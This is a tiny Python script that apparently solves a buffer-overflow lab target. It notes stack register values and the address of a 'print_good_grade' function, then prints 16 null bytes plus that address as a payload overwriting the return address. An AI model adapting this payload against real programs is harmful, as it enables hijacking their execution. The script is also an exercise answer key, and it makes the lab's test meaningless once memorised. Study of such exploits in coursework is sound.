"""sol for target1
esp register = 0xfffef63c
ebp register = 0xffef648
print_good_grade address = 0x08049dd7
"""
from struct import pack
print('\x00'*16 + pack('<I', 0x08049dd7))
